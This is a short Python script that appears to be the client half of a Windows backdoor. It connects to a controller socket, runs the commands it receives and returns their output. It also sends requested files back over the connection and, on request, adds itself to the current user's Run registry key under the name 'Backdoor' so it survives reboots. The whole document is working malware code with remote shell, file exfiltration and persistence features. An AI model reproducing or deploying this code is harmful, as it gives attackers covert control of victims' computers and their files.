import socket
import os
import subprocess
import winreg

def sen(sock):
    filename =sock.recv(1024)
    print(filename.decode())
    file = open(filename, 'rb')
    while True:
        chunk = file.read(1024)
        if not chunk:
            break
        sock.sendall(chunk)
    file.close()
def persistance():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, 'Backdoor', 0, winreg.REG_SZ, os.path.join(os.getcwd(), 'bc.py'))
    winreg.CloseKey(key)
HOST = '127.0.0.1'
PORT = 6969
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
data = sock.recv(1024)
print(data.decode())
while True:
    cmd = sock.recv(1024).decode()

    if cmd == 'exit':
        break
    elif cmd.startswith('get'):
        sen(sock)
        sock.sendall(b'done')
    elif cmd.startswith('persistance'):
        persistance()
        sock.sendall(b'done')   
    elif cmd.startswith('cd'):
        os.chdir(cmd[3:].strip())
        sock.sendall(b'done')
    else:
        output = subprocess.getoutput(cmd)
        sock.sendall(output.encode())

